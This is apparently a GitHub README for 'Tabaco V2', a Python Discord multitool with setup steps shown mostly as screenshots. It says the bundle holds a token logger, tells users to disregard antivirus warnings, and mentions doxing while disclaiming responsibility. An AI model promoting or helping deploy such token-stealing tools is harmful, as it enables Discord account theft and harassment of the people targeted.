<div align="center">
  <h1>🟢Tabaco V2 Discord Multitool🟢</h1>
        <p>🟢Discord Tool made bye a rookie python scripter🟢<p>
  <p>✏️For Educational Purpose Only +  i just got board and made a tool i do this for fun i dont take it seriously✏️</p>
 


🚧EVERYONE I HAVE DISCONTINUED MAKING THIS TOOL DUE TO THE FACT I CANT BE ASKED DO WHAT U WANT WITH IT STEAL MY CODE IDC🚧

🚧I AM NOT RESPONSIBLE FOR ANY DAMEGE DELT WITH THIS SCRIPT LIKE BRO AINT MY FAULT SOME SCRIPT SKID DOXED U WITH THIS🚧

![output-onlinegiftools](https://user-images.githubusercontent.com/129594730/231024879-abf1939a-03ad-4dae-ac00-da2e97eb9528.gif)





![carbon (1)](https://user-images.githubusercontent.com/111347467/230566365-bf9d61f0-edab-4e77-81f5-d00538265ca7.png)

How to run Windows

WARNING if it comes up as a virus its not its the token logger inside of the multitool that u can use 

1 Go in the directory of Tabaco V2

2 Locate the SETUP.bat "Dont Run Start.bat first it wont work"

3 Run SETUP.bat

4 Run START.bat

5 enjoy 

Error or bug fixing

If you get a error like this


![carbon (2)](https://user-images.githubusercontent.com/111347467/230567488-2ec726ce-21c5-4f65-a2f4-df19d3a543ed.png)

Fix by putting this in cmd

![carbon (3)](https://user-images.githubusercontent.com/111347467/230567611-7030cc99-5db9-46d2-b984-ed0a078120a3.png)

Or this

![carbon (4)](https://user-images.githubusercontent.com/111347467/230567667-539c8e5e-e698-43d8-a917-1a4e0a4204ad.png)

if you get the error "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases."

go to microsoft store and install python 3.8 3.9 3.10 from the microsoft store then run SETUP.bat again

If you are on mac or linux 


1 install python with https://python.org need python 3.8 to 3.10

2 install pip 

![carbon (5)](https://user-images.githubusercontent.com/111347467/230568632-09f7dc7f-763e-4f84-a07c-3651ce13592a.png)

3 Change the file name of setup.bat to setup.txt and such

4 open and copy all the pip install stuff and everything inside the .bat

5 paste into the setup.txt

6 open the tools not the menu.py just the tools 

7 then you can start running the tools manully

8 enjoy






Tabaco V2 is a discord multipurpose tool made for educational use only 





📘for security reassons we do not promote hacking or stealing accounts or anything againts Discords TOS this is for educational use only📘






![output-onlinepngtools_1-modified_21](https://user-images.githubusercontent.com/111347467/230570471-41fb684f-c4b4-4ff4-b713-0072d3a841d3.png)


Heres a Video On Tabaco ! 

https://www.youtube.com/watch?v=gtRdgsgn8fg&t=31s


